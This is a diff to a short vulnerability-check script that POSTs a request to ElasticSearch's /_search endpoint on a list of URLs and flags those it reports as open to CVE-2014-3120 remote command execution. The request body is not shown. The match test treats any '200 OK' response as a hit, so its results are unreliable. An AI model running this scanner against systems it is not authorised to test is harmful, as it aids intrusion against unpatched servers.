@@ -1,4 +1,4 @@
-#request url = var
+#request urls = array
 #define payload = /_search?pretty
 #define bug =  200 OK
 #define info = 存在CVE-2014-3120 ElasticSearch远程命令执行
@@ -7,9 +7,19 @@
 
 function main(args)
 {
-	res = HttpPost(url.payload,post,"Content-Type: application/x-www-form-urlencoded".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
-	if(StrFindStr(res[1],bug,0)!= "-1")
-	{
-		print(url.info);
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpPost(url.payload,post,"Content-Type: application/x-www-form-urlencoded".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[1],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
 	}
 }
